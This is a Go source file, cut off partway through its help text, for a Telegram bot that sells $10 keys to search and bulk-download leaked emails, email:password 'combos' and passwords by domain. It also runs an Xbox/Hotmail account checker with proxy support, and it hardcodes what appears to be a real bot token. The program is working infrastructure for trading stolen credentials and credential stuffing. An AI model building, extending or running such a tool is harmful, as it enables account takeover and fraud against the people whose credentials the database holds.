package telegram

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"toolbot/modules/admin"
	"toolbot/modules/checker"
	"toolbot/modules/database"
	"toolbot/modules/proxy"
	"toolbot/modules/search"
	"toolbot/modules/user"
)

const (
	BotToken = "8109047375:AAHZtl_qWAxXcc3APzcjck43pSSBKssUgDI"
)

type CheckSession struct {
	UserID          int64
	SessionID       string
	Combos          []string
	UncheckedCombos []string // For files with >10k combos
	StartTime       time.Time
	Status          string
	TotalCombos     int // Total combos in original file
}

type DownloadRequest struct {
	Type   string // emails, combos, passwords
	Domain string
}

type Bot struct {
	api              *tgbotapi.BotAPI
	db               *database.Database
	userManager      *user.Manager
	adminManager     *admin.Manager
	searchManager    *search.Manager
	checkerManager   *checker.Manager
	proxyManager     *proxy.Manager
	userStates       map[int64]string          // Track what users are trying to upload
	userSessions     map[string]*CheckSession  // Track checking sessions
	downloadRequests map[int64]*DownloadRequest // Track pending download requests
}

func NewBot(db *database.Database, userManager *user.Manager, adminManager *admin.Manager,
	searchManager *search.Manager, checkerManager *checker.Manager, proxyManager *proxy.Manager) (*Bot, error) {

	api, err := tgbotapi.NewBotAPI(BotToken)
	if err != nil {
		return nil, err
	}

	api.Debug = false
	log.Printf("Authorized on account %s", api.Self.UserName)

	return &Bot{
		api:              api,
		db:               db,
		userManager:      userManager,
		adminManager:     adminManager,
		searchManager:    searchManager,
		checkerManager:   checkerManager,
		proxyManager:     proxyManager,
		userStates:       make(map[int64]string),
		userSessions:     make(map[string]*CheckSession),
		downloadRequests: make(map[int64]*DownloadRequest),
	}, nil
}

func (b *Bot) Start() {
	// Start background database stats counter
	go b.startDatabaseStatsCounter()

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := b.api.GetUpdatesChan(u)

	for update := range updates {
		if update.Message != nil {
			b.handleMessage(update)
		} else if update.CallbackQuery != nil {
			b.handleCallback(update)
		}
	}
}

func (b *Bot) startDatabaseStatsCounter() {
	// Run immediately on startup
	b.updateDatabaseStats()

	// Then run every 24 hours
	ticker := time.NewTicker(24 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		b.updateDatabaseStats()
	}
}

func (b *Bot) updateDatabaseStats() {
	log.Println("Starting database stats count (this may take a while)...")

	var totalEmails, totalCombos, totalPasswords int64
	var err error

	// Count emails
	totalEmails, err = b.db.GetTotalEmails()
	if err != nil {
		log.Printf("Error counting emails: %v", err)
	}

	// Count combos
	totalCombos, err = b.db.GetTotalCombos()
	if err != nil {
		log.Printf("Error counting combos: %v", err)
	}

	// Count passwords
	totalPasswords, err = b.db.GetTotalPasswords()
	if err != nil {
		log.Printf("Error counting passwords: %v", err)
	}

	// Update cached stats
	b.adminManager.UpdateDatabaseStats(totalEmails, totalCombos, totalPasswords)

	log.Printf("Database stats updated - Emails: %d, Combos: %d, Passwords: %d", totalEmails, totalCombos, totalPasswords)
}

func (b *Bot) handleMessage(update tgbotapi.Update) {
	// Check maintenance mode
	if b.adminManager.GetSettings().MaintenanceMode && !b.adminManager.IsAdmin(update.Message.From.ID) {
		msg := tgbotapi.NewMessage(update.Message.Chat.ID, "🚧 Bot is currently under maintenance. Please try again later.")
		b.api.Send(msg)
		return
	}

	// Get or create user
	user, err := b.userManager.GetOrCreateUser(update.Message.From.ID, update.Message.From.UserName, update.Message.From.FirstName)
	if err != nil {
		log.Printf("Error getting user: %v", err)
		return
	}

	// Check if user is banned
	if user.IsBanned {
		msg := tgbotapi.NewMessage(update.Message.Chat.ID, "❌ You have been banned from using this bot.")
		b.api.Send(msg)
		return
	}

	// Handle file uploads
	if update.Message.Document != nil {
		b.handleFileUpload(update)
		return
	}

	// Handle admin custom input (for custom values in settings)
	if b.adminManager.IsAdmin(update.Message.From.ID) {
		if b.adminManager.HandleAdminInput(b.api, update.Message.Chat.ID, update.Message.From.ID, update.Message.Text) {
			return
		}
	}

	// Handle admin commands
	if b.adminManager.IsAdmin(update.Message.From.ID) && strings.HasPrefix(update.Message.Text, "/admin") {
		b.adminManager.HandleAdminCommand(b.api, update)
		return
	}

	// Handle regular commands
	switch update.Message.Command() {
	case "start":
		b.handleStart(update)
	case "search":
		b.handleSearchCommand(update)
	case "proxy":
		b.handleProxyCommand(update)
	case "check":
		b.handleCheckCommand(update)
	case "profile":
		b.handleProfile(update)
	case "help":
		b.handleHelp(update)
	default:
		// Handle text messages (for search input, etc.)
		b.handleTextMessage(update)
	}
}

func (b *Bot) handleCallback(update tgbotapi.Update) {
	callback := update.CallbackQuery
	chatID := callback.Message.Chat.ID
	messageID := callback.Message.MessageID
	userID := callback.From.ID

	// Check maintenance mode (except for admins)
	if b.adminManager.GetSettings().MaintenanceMode && !b.adminManager.IsAdmin(userID) {
		b.api.Request(tgbotapi.NewCallback(callback.ID, "🚧 Bot is under maintenance"))
		return
	}

	// Ensure user exists in database (create if not exists)
	user, err := b.userManager.GetOrCreateUser(userID, callback.From.UserName, callback.From.FirstName)
	if err != nil {
		log.Printf("Error getting user in callback: %v", err)
		b.api.Request(tgbotapi.NewCallback(callback.ID, "Error processing request"))
		return
	}

	// Check if user is banned (except for admins)
	if user.IsBanned && !b.adminManager.IsAdmin(userID) {
		b.api.Request(tgbotapi.NewCallback(callback.ID, "❌ You are banned"))
		return
	}

	// Check if bot key is required and user doesn't have one
	// Allow certain callbacks without API key: redeem_api_key, profile, help, main_menu
	settings := b.adminManager.GetSettings()
	if !settings.PublicMode && !b.adminManager.IsAdmin(userID) && user.APIKey == "" {
		allowedCallbacks := []string{"redeem_api_key", "profile", "help", "main_menu"}
		isAllowed := false
		for _, allowed := range allowedCallbacks {
			if callback.Data == allowed {
				isAllowed = true
				break
			}
		}
		
		if !isAllowed {
			b.editMessage(chatID, messageID, "🔐 **Bot Key Required**\n\nYou need a bot key to access this feature.\n\nContact @xorons for a bot key - $10", nil)
			keyboard := tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData("🔑 Redeem Bot Key", "redeem_api_key"),
				),
			)
			b.editMessage(chatID, messageID, "🔐 **Bot Key Required**\n\nYou need a bot key to access this feature.\n\nContact @xorons for a bot key - $10", &keyboard)
			b.api.Request(tgbotapi.NewCallback(callback.ID, ""))
			return
		}
	}

	// Check if admin callback
	if b.adminManager.IsAdmin(userID) && (strings.HasPrefix(callback.Data, "admin_") || 
		strings.HasPrefix(callback.Data, "toggle_") || 
		strings.HasPrefix(callback.Data, "user_") ||
		strings.HasPrefix(callback.Data, "api_key_") ||
		strings.HasPrefix(callback.Data, "view_all_keys") ||
		strings.HasPrefix(callback.Data, "config_") ||
		strings.HasPrefix(callback.Data, "custom_") ||
		strings.HasPrefix(callback.Data, "set_") ||
		strings.HasPrefix(callback.Data, "regen_") ||
		strings.HasPrefix(callback.Data, "delete_") ||
		strings.HasPrefix(callback.Data, "enable_") ||
		strings.HasPrefix(callback.Data, "disable_") ||
		strings.HasPrefix(callback.Data, "ban_") ||
		strings.HasPrefix(callback.Data, "unban_") ||
		strings.HasPrefix(callback.Data, "reset_")) {
		b.adminManager.HandleAdminCallback(b.api, callback)
		return
	}

	// Handle regular callbacks - pass messageID for editing instead of sending new messages
	// NOTE: More specific prefixes MUST come BEFORE more general ones!
	switch {
	case strings.HasPrefix(callback.Data, "search_"):
		b.handleSearchCallbackEdit(callback, messageID)
	case strings.HasPrefix(callback.Data, "download_"):
		b.handleDownloadCallback(callback)
	case strings.HasPrefix(callback.Data, "proxy_"):
		b.handleProxyCallbackEdit(callback, messageID)
	// Specific check_* cases must come BEFORE the general check_ case
	case strings.HasPrefix(callback.Data, "check_file_"):
		b.handleCheckFileCallback(callback)
	case strings.HasPrefix(callback.Data, "check_settings_"):
		b.handleCheckSettingsCallback(callback)
	case strings.HasPrefix(callback.Data, "start_check_"):
		b.handleStartCheckCallback(callback)
	case strings.HasPrefix(callback.Data, "stop_check_"):
		b.handleStopCheckCallback(callback)
	// General check_ case comes LAST
	case strings.HasPrefix(callback.Data, "check_"):
		b.handleCheckCallbackEdit(callback, messageID)
	case callback.Data == "main_menu":
		b.editMainMenu(chatID, messageID)
	case callback.Data == "profile":
		b.editProfile(chatID, messageID, userID)
	case callback.Data == "help":
		b.editHelp(chatID, messageID)
	case callback.Data == "redeem_api_key":
		b.handleRedeemAPIKeyEdit(callback, messageID)
	}

	// Answer callback to remove loading state
	b.api.Request(tgbotapi.NewCallback(callback.ID, ""))
}

// escapeMarkdown escapes special Markdown characters to prevent formatting issues
// Only escapes characters that commonly appear in user data and cause issues
func escapeMarkdown(text string) string {
	// Escape only the most problematic characters for user data
	replacer := strings.NewReplacer(
		"_", "\\_",
		"*", "\\*",
		"[", "\\[",
		"]", "\\]",
		"(", "\\(",
		")", "\\)",
		"`", "\\`",
		"~", "\\~",
	)
	return replacer.Replace(text)
}

// editMessage is a helper to edit an existing message with new text and keyboard
func (b *Bot) editMessage(chatID int64, messageID int, text string, keyboard *tgbotapi.InlineKeyboardMarkup) {
	editMsg := tgbotapi.NewEditMessageText(chatID, messageID, text)
	editMsg.ParseMode = "Markdown"
	if keyboard != nil {
		editMsg.ReplyMarkup = keyboard
	}
	_, err := b.api.Send(editMsg)
	if err != nil {
		log.Printf("Error editing message (chatID: %d, msgID: %d): %v", chatID, messageID, err)
		// Fallback: send as new message if edit fails
		msg := tgbotapi.NewMessage(chatID, text)
		msg.ParseMode = "Markdown"
		if keyboard != nil {
			msg.ReplyMarkup = keyboard
		}
		_, err = b.api.Send(msg)
		if err != nil {
			log.Printf("Error sending fallback message: %v", err)
		}
	}
}

func (b *Bot) handleStart(update tgbotapi.Update) {
	userID := update.Message.From.ID
	chatID := update.Message.Chat.ID
	
	// Check if user is admin - admins always get main menu
	if b.adminManager.IsAdmin(userID) {
		b.showMainMenu(chatID)
		return
	}
	
	// Check if public mode is enabled
	settings := b.adminManager.GetSettings()
	
	if !settings.PublicMode {
		// Check if user has Bot Key
		user, err := b.userManager.GetUser(userID)
		if err != nil || user.APIKey == "" {
			b.showAPIKeyRequest(chatID)
			return
		}
	}
	
	b.showMainMenu(chatID)
}

func (b *Bot) showAPIKeyRequest(chatID int64) {
	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔑 Redeem Bot Key", "redeem_api_key"),
		),
	)

	text := `🔐 **Bot Key Required**

This bot requires a Bot Key to access its features.

**Need API Access?**
Contact @xorons for a Bot Key - $10

Click the button below to redeem your Bot Key:`

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) getRedeemAPIKeyContent() (string, tgbotapi.InlineKeyboardMarkup) {
	text := `🔑 **Enter Your Bot Key**

Please send me your Bot Key to activate your account.

The Bot Key should be provided by @xorons.`

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "main_menu"),
		),
	)

	return text, keyboard
}

func (b *Bot) handleRedeemAPIKey(callback *tgbotapi.CallbackQuery) {
	chatID := callback.Message.Chat.ID
	userID := callback.From.ID
	
	// Set user state to waiting for Bot Key
	b.userStates[userID] = "waiting_api_key"
	
	text, keyboard := b.getRedeemAPIKeyContent()
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) handleRedeemAPIKeyEdit(callback *tgbotapi.CallbackQuery, messageID int) {
	chatID := callback.Message.Chat.ID
	userID := callback.From.ID
	
	// Set user state to waiting for Bot Key
	b.userStates[userID] = "waiting_api_key"
	
	text, keyboard := b.getRedeemAPIKeyContent()
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleAPIKeyInput(update tgbotapi.Update, apiKey string) {
	userID := update.Message.From.ID
	chatID := update.Message.Chat.ID
	username := update.Message.From.UserName
	
	// Clear user state
	delete(b.userStates, userID)
	
	// Validate Bot Key format (basic validation)
	if len(apiKey) < 8 {
		msg := tgbotapi.NewMessage(chatID, "❌ Invalid Bot Key format. Please try again.")
		b.api.Send(msg)
		return
	}
	
	// Get or create user with username for admin tracking
	_, err := b.userManager.GetOrCreateUser(userID, username, "")
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error creating user: "+err.Error())
		b.api.Send(msg)
		return
	}
	
	// Try to set the Bot Key for the user
	err = b.userManager.SetAPIKey(userID, apiKey)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, "❌ Error setting Bot Key: "+err.Error())
		b.api.Send(msg)
		return
	}
	
	// Success message
	text := `✅ **Bot Key Activated!**

Your Bot Key has been successfully activated. You now have access to all bot features.

Welcome to ToolBot! 🎉`

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🚀 Get Started", "main_menu"),
		),
	)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) getMainMenuContent() (string, tgbotapi.InlineKeyboardMarkup) {
	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔍 Search", "search_menu"),
			tgbotapi.NewInlineKeyboardButtonData("🔧 Check Accounts", "check_menu"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🌐 Proxy Manager", "proxy_menu"),
			tgbotapi.NewInlineKeyboardButtonData("👤 Profile", "profile"),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("❓ Help", "help"),
		),
	)

	// Get settings to determine if we should show API access message
	settings := b.adminManager.GetSettings()
	
	text := `🤖 **Welcome to ToolBot**

**Available Features:**
🔍 **Search** - Search email databases by domain
🔧 **Check Accounts** - Verify Xbox/Hotmail accounts
🌐 **Proxy Manager** - Manage your proxy lists
👤 **Profile** - View your stats and limits`

	// Only show API access message if public mode is enabled
	if settings.PublicMode {
		text += `

**Need API Access?**
Contact @xorons for a Bot Key - $10`
	}

	text += `

Select an option below to get started:`

	return text, keyboard
}

func (b *Bot) showMainMenu(chatID int64) {
	text, keyboard := b.getMainMenuContent()
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editMainMenu(chatID int64, messageID int) {
	text, keyboard := b.getMainMenuContent()
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleSearchCommand(update tgbotapi.Update) {
	b.showSearchMenu(update.Message.Chat.ID, update.Message.From.ID)
}

func (b *Bot) getSearchMenuContent(userID int64) (string, tgbotapi.InlineKeyboardMarkup) {
	// Get popular domains
	domains, _ := b.searchManager.GetPopularDomains()

	var rows [][]tgbotapi.InlineKeyboardButton

	// Add domain buttons (2 per row)
	for i := 0; i < len(domains); i += 2 {
		var row []tgbotapi.InlineKeyboardButton
		row = append(row, tgbotapi.NewInlineKeyboardButtonData(domains[i], "search_domain_"+domains[i]))
		if i+1 < len(domains) {
			row = append(row, tgbotapi.NewInlineKeyboardButtonData(domains[i+1], "search_domain_"+domains[i+1]))
		}
		rows = append(rows, row)
	}

	// Add custom search and back buttons
	rows = append(rows, tgbotapi.NewInlineKeyboardRow(
		tgbotapi.NewInlineKeyboardButtonData("✏️ Custom Search", "search_custom"),
	))
	rows = append(rows, tgbotapi.NewInlineKeyboardRow(
		tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "main_menu"),
	))

	keyboard := tgbotapi.NewInlineKeyboardMarkup(rows...)

	// Get user limits
	user, err := b.userManager.GetUser(userID)
	var limitsText string
	if err == nil {
		searchesLeft := user.DailyLimit - user.DailySearchCount
		downloadsLeft := user.DailyDownloadLimit - user.DailyDownloadCount
		if searchesLeft < 0 {
			searchesLeft = 0
		}
		if downloadsLeft < 0 {
			downloadsLeft = 0
		}
		limitsText = fmt.Sprintf(`
📊 **Your Limits:**
🔍 Searches: %d/%d remaining
📥 Downloads: %d/%d remaining`, searchesLeft, user.DailyLimit, downloadsLeft, user.DailyDownloadLimit)
	}

	// Get cached database stats
	stats := b.adminManager.GetDatabaseStats()
	var statsText string
	if stats.TotalEmails > 0 || stats.TotalCombos > 0 || stats.TotalPasswords > 0 {
		statsText = fmt.Sprintf(`

📦 **Database Stats:**
📧 Total Emails: %s
🔗 Total Combos: %s
🔑 Total Passwords: %s`, formatNumber(stats.TotalEmails), formatNumber(stats.TotalCombos), formatNumber(stats.TotalPasswords))
	}

	text := fmt.Sprintf(`🔍 **Email Search**
%s%s

Select a domain to search or use custom search:

**Popular Domains:**`, limitsText, statsText)

	return text, keyboard
}

func formatNumber(n int64) string {
	if n >= 1000000000 {
		return fmt.Sprintf("%.2fB", float64(n)/1000000000)
	} else if n >= 1000000 {
		return fmt.Sprintf("%.2fM", float64(n)/1000000)
	} else if n >= 1000 {
		return fmt.Sprintf("%.2fK", float64(n)/1000)
	}
	return fmt.Sprintf("%d", n)
}

func (b *Bot) showSearchMenu(chatID, userID int64) {
	text, keyboard := b.getSearchMenuContent(userID)
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editSearchMenu(chatID int64, messageID int, userID int64) {
	text, keyboard := b.getSearchMenuContent(userID)
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleSearchCallback(callback *tgbotapi.CallbackQuery) {
	parts := strings.Split(callback.Data, "_")
	userID := callback.From.ID

	switch parts[1] {
	case "menu":
		b.showSearchMenu(callback.Message.Chat.ID, userID)
	case "domain":
		if len(parts) >= 3 {
			domain := strings.Join(parts[2:], "_")
			b.performSearch(callback.Message.Chat.ID, userID, domain)
		}
	case "custom":
		b.promptCustomSearch(callback.Message.Chat.ID)
	}
}

func (b *Bot) handleSearchCallbackEdit(callback *tgbotapi.CallbackQuery, messageID int) {
	parts := strings.Split(callback.Data, "_")
	chatID := callback.Message.Chat.ID
	userID := callback.From.ID

	switch parts[1] {
	case "menu":
		b.editSearchMenu(chatID, messageID, userID)
	case "domain":
		if len(parts) >= 3 {
			domain := strings.Join(parts[2:], "_")
			b.performSearchEdit(chatID, messageID, userID, domain)
		}
	case "custom":
		b.promptCustomSearchEdit(chatID, messageID)
	}
}

func (b *Bot) performSearch(chatID, userID int64, domain string) {
	text, keyboard, err := b.getSearchResultContent(userID, domain)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, err.Error())
		b.api.Send(msg)
		return
	}

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) performSearchEdit(chatID int64, messageID int, userID int64, domain string) {
	text, keyboard, err := b.getSearchResultContent(userID, domain)
	if err != nil {
		b.editMessage(chatID, messageID, err.Error(), nil)
		return
	}

	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) getSearchResultContent(userID int64, domain string) (string, tgbotapi.InlineKeyboardMarkup, error) {
	// Validate domain
	if err := b.searchManager.ValidateDomain(domain); err != nil {
		return "❌ Invalid domain: " + err.Error(), tgbotapi.InlineKeyboardMarkup{}, err
	}

	// Get global download limit
	globalLimit := b.adminManager.GetSettings().GlobalDownloadLimit

	// Perform search with limit (faster - stops counting after reaching limit)
	result, err := b.searchManager.SearchDomainWithLimit(userID, domain, globalLimit)
	if err != nil {
		return "❌ Search failed: " + err.Error(), tgbotapi.InlineKeyboardMarkup{}, err
	}

	// Show results
	text := fmt.Sprintf(`🔍 **Search Results for %s**

📧 **Emails Found:** %d
🔗 **Combos Found:** %d
🔑 **Passwords Available:** %d

What would you like to download?`, domain, result.EmailCount, result.ComboCount, result.PasswordCount)

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("📧 Emails", "download_emails_"+domain),
			tgbotapi.NewInlineKeyboardButtonData("🔗 Combos", "download_combos_"+domain),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔑 Passwords", "download_passwords_"+domain),
		),
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "search_menu"),
		),
	)

	return text, keyboard, nil
}

func (b *Bot) handleDownloadCallback(callback *tgbotapi.CallbackQuery) {
	parts := strings.Split(callback.Data, "_")
	if len(parts) < 3 {
		return
	}

	downloadType := parts[1]
	
	// Handle checker result downloads
	if downloadType == "valid" || downloadType == "invalid" || downloadType == "report" || downloadType == "unchecked" {
		sessionID := strings.Join(parts[2:], "_")
		b.handleCheckerDownload(callback, downloadType, sessionID)
		return
	}

	// Handle search downloads
	domain := strings.Join(parts[2:], "_")
	b.promptDownloadCount(callback.Message.Chat.ID, callback.From.ID, downloadType, domain)
}

func (b *Bot) promptDownloadCount(chatID, userID int64, downloadType, domain string) {
	globalLimit := b.adminManager.GetSettings().GlobalDownloadLimit
	text := fmt.Sprintf(`📥 **Download %s for %s**

How many lines would you like to download?
(Maximum: %d per download)

Please send a number:`, downloadType, domain, globalLimit)

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	b.api.Send(msg)

	// Store download request for this user
	b.downloadRequests[userID] = &DownloadRequest{
		Type:   downloadType,
		Domain: domain,
	}
}

func (b *Bot) handleTextMessage(update tgbotapi.Update) {
	text := strings.TrimSpace(update.Message.Text)
	userID := update.Message.From.ID
	chatID := update.Message.Chat.ID

	// Check user state for uploads and Bot Key input
	userState, exists := b.userStates[userID]
	if exists {
		if userState == "proxy_upload" {
			b.handleProxyTextUpload(update)
			return
		} else if userState == "combo_upload" {
			b.handleComboTextUpload(update)
			return
		} else if userState == "waiting_api_key" {
			b.handleAPIKeyInput(update, text)
			return
		}
	}

	// Check if user has a pending download request and entered a number
	if downloadReq, hasDownload := b.downloadRequests[userID]; hasDownload {
		if count, err := strconv.Atoi(text); err == nil {
			b.processDownload(chatID, userID, downloadReq, count)
			delete(b.downloadRequests, userID)
			return
		}
	}

	// Check if it's a domain search
	if strings.HasPrefix(text, "@") {
		b.performSearch(chatID, userID, text)
		return
	}

	// Default response
	msg := tgbotapi.NewMessage(chatID, "❓ I didn't understand that. Use /start to see the main menu.")
	b.api.Send(msg)
}

func (b *Bot) processDownload(chatID, userID int64, req *DownloadRequest, count int) {
	globalLimit := b.adminManager.GetSettings().GlobalDownloadLimit
	if count <= 0 || count > globalLimit {
		msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("❌ Please enter a number between 1 and %d.", globalLimit))
		b.api.Send(msg)
		return
	}

	// Check if user can download the requested amount (daily limit)
	canDownload, err := b.userManager.CanDownloadAmount(userID, count)
	if err != nil {
		errMsg := tgbotapi.NewMessage(chatID, "❌ Error checking download limit: "+err.Error())
		b.api.Send(errMsg)
		return
	}
	if !canDownload {
		user, _ := b.userManager.GetUser(userID)
		remaining := user.DailyDownloadLimit - user.DailyDownloadCount
		if remaining < 0 {
			remaining = 0
		}
		errMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("❌ You don't have enough downloads remaining!\n\n📊 Requested: %d\n📥 Remaining: %d/%d\n\nTry a smaller amount or wait until tomorrow.", count, remaining, user.DailyDownloadLimit))
		b.api.Send(errMsg)
		return
	}

	// Send processing message
	msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("⏳ Generating %d %s for %s... Please wait.", count, req.Type, req.Domain))
	b.api.Send(msg)

	// Generate the download file
	downloadReq := &search.DownloadRequest{
		UserID: userID,
		Domain: req.Domain,
		Type:   req.Type,
		Count:  count,
		Format: "txt",
	}

	filePath, err := b.searchManager.GenerateDownload(downloadReq)
	if err != nil {
		errMsg := tgbotapi.NewMessage(chatID, "❌ Failed to generate download: "+err.Error())
		b.api.Send(errMsg)
		return
	}

	// Send the file
	doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(filePath))
	doc.Caption = fmt.Sprintf("📥 %s for %s (%d lines)", req.Type, req.Domain, count)
	_, err = b.api.Send(doc)
	if err != nil {
		errMsg := tgbotapi.NewMessage(chatID, "❌ Failed to send file: "+err.Error())
		b.api.Send(errMsg)
		return
	}

	// Increment download count by the actual amount downloaded
	b.userManager.IncrementDownloadCountBy(userID, count)

	// Clean up the file after sending
	os.Remove(filePath)

	// Get updated user info for remaining count
	user, _ := b.userManager.GetUser(userID)
	downloadsLeft := user.DailyDownloadLimit - user.DailyDownloadCount
	if downloadsLeft < 0 {
		downloadsLeft = 0
	}

	// Send success message with back button
	successMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("✅ Download complete!\n\n📥 Downloaded: %d lines\n📊 Remaining today: %d/%d", count, downloadsLeft, user.DailyDownloadLimit))
	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔍 Search Again", "search_menu"),
			tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", "main_menu"),
		),
	)
	successMsg.ReplyMarkup = keyboard
	b.api.Send(successMsg)
}

func (b *Bot) getCustomSearchContent() (string, tgbotapi.InlineKeyboardMarkup) {
	text := `✏️ **Custom Domain Search**

Please enter the domain you want to search for.
Format: @domain.com

Example: @gmail.com`

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "search_menu"),
		),
	)

	return text, keyboard
}

func (b *Bot) promptCustomSearch(chatID int64) {
	text, keyboard := b.getCustomSearchContent()
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) promptCustomSearchEdit(chatID int64, messageID int) {
	text, keyboard := b.getCustomSearchContent()
	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleProfile(update tgbotapi.Update) {
	b.showProfile(update.Message.Chat.ID, update.Message.From.ID)
}

func (b *Bot) getProfileContent(userID int64) (string, tgbotapi.InlineKeyboardMarkup, error) {
	user, err := b.userManager.GetUser(userID)
	if err != nil {
		log.Printf("Error loading profile for user %d: %v", userID, err)
		keyboard := tgbotapi.NewInlineKeyboardMarkup(
			tgbotapi.NewInlineKeyboardRow(
				tgbotapi.NewInlineKeyboardButtonData("🔄 Retry", "profile"),
				tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "main_menu"),
			),
		)
		return "❌ Error loading profile. Please try again.", keyboard, err
	}

	username := user.Username
	if username == "" {
		username = fmt.Sprintf("User %d", userID)
	} else {
		// Escape special Markdown characters in username
		username = escapeMarkdown(username)
	}

	apiStatus := "❌ No Bot Key"
	if user.APIKey != "" {
		apiStatus = "✅ Bot Key Active"
	}

	// Calculate remaining
	searchesLeft := user.DailyLimit - user.DailySearchCount
	downloadsLeft := user.DailyDownloadLimit - user.DailyDownloadCount
	if searchesLeft < 0 {
		searchesLeft = 0
	}
	if downloadsLeft < 0 {
		downloadsLeft = 0
	}

	accountStatus := "✅ Active"
	if user.IsBanned {
		accountStatus = "🚫 Banned"
	}

	text := fmt.Sprintf("👤 *Your Profile*\n\n"+
		"*User Info:*\n"+
		"• Username: %s\n"+
		"• User ID: `%d`\n"+
		"• API Status: %s\n\n"+
		"*Daily Usage:*\n"+
		"• Searches: %d / %d (%d remaining)\n"+
		"• Downloads: %d / %d (%d remaining)\n\n"+
		"*Total Stats:*\n"+
		"• Total Searches: %d\n"+
		"• Total Downloads: %d\n\n"+
		"*Account Status:* %s\n"+
		"*Member Since:* %s",
		username,
		userID,
		apiStatus,
		user.DailySearchCount, user.DailyLimit, searchesLeft,
		user.DailyDownloadCount, user.DailyDownloadLimit, downloadsLeft,
		user.TotalSearchCount,
		user.TotalDownloadCount,
		accountStatus,
		user.CreatedAt.Format("Jan 2, 2006"))

	keyboard := tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", "profile"),
			tgbotapi.NewInlineKeyboardButtonData("⬅️ Back", "main_menu"),
		),
	)

	return text, keyboard, nil
}

func (b *Bot) showProfile(chatID, userID int64) {
	text, keyboard, err := b.getProfileContent(userID)
	if err != nil {
		msg := tgbotapi.NewMessage(chatID, text)
		b.api.Send(msg)
		return
	}

	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	msg.ReplyMarkup = keyboard
	b.api.Send(msg)
}

func (b *Bot) editProfile(chatID int64, messageID int, userID int64) {
	text, keyboard, err := b.getProfileContent(userID)
	if err != nil {
		b.editMessage(chatID, messageID, text, nil)
		return
	}

	b.editMessage(chatID, messageID, text, &keyboard)
}

func (b *Bot) handleHelp(update tgbotapi.Update) {
	b.showHelp(update.Message.Chat.ID)
}

func (b *Bot) getHelpContent() (string, tgbotapi.InlineKeyboardMarkup) {
	text := `❓ **Help & Commands**

**Available Commands:**
• /start - Show main menu
• /search - Search email databases
• /proxy - Manage proxies
• /check - Check Xbox accounts
• /profile - View your profile
• /help - Show this help

**How to Use:**
1. **Search** - Enter a domain like @gmail.com to search
2. **Download** - Choose what to download and how many lines
3. **Proxy** - Upload your proxy list for checking
4. **Check** - Verify Xbox/Hotmail accounts

**Limits:**
